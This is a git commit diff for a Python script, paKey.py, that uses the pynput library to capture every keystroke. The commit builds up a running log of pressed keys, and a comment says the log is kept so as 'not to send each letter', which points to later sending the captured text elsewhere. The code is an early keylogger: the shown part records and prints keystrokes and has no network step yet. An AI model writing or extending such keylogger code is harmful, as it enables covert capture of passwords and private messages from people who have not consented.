67476be2146394dd370fe0da4526a69140278890
Anastasios <apantzar@csd.auth.gr>
2021-03-11 15:21:57 +0200

    Basic with log

--- paKey.py
+++ paKey.py
@@ -1,10 +1,16 @@
 #!/usr/bin/env python
 import pynput.keyboard
 
+# global log variable in order not to send each letter
+log = ""
 
-# process to catch the key
+
+# process to catch keystrokes
+
 def process_key_press(key):
-    print(key)
+    global log
+    log = log + str(key)
+    print(log)
 
 
 keyboardListener = pynput.keyboard.Listener(on_press=process_key_press)
